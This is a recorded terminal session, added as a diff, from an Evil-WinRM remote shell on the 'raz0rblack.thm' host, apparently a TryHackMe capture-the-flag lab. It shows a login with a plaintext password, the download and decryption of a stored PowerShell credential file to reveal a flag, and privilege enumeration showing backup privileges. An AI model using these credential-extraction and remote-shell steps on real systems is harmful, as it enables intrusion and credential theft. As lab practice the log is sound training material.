@@ -1,0 +1,104 @@
+Script started on 2025-04-08 16:38:07+03:00 [COMMAND="evil-winrm -i raz0rblack.thm -u xyan1d3 -p cyanide9amine5628" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+                                        
+[0;34mEvil-WinRM shell v3.7[0m
+                                        
+[0;1;33mWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine[0m
+                                        
+[0;35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[0m
+                                        
+[0;34mInfo: Establishing connection to remote endpoint[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3\Documents> dir
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3\Documents> cd ..
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3> dir
+
+
+    Directory: C:\Users\xyan1d3
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021   9:34 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml
+
+
+dow[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3> dow[37G[Kdownloas[44G[Kd xyan1d3.xml
+The term 'dodownload' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ dodownload xyan1d3.xml
++ ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (dodownload:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3> [35Gdodownload xyan1d3.xml
+The term 'dodownload' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ dodownload xyan1d3.xml
++ ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (dodownload:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+^[[A[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3> [35Gdodownload xyan1d3.xml[35G[K[35Gdodownload xyan1d3.xmlo[36G[Pd[36G[Po
+                                        
+[0;34mInfo: Downloading C:\Users\xyan1d3\xyan1d3.xml to xyan1d3.xml[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3> $Credential.GetNetworkCredential().password
+LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name          SID
+================== ============================================
+raz0rblack\xyan1d3 S-1-5-21-3403444377-2687699443-13012745-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\xyan1d3> exit
+                                        
+[0;34mInfo: Exiting with code 0[0m
+
+Script done on 2025-04-08 16:45:56+03:00 [COMMAND_EXIT_CODE="0"]
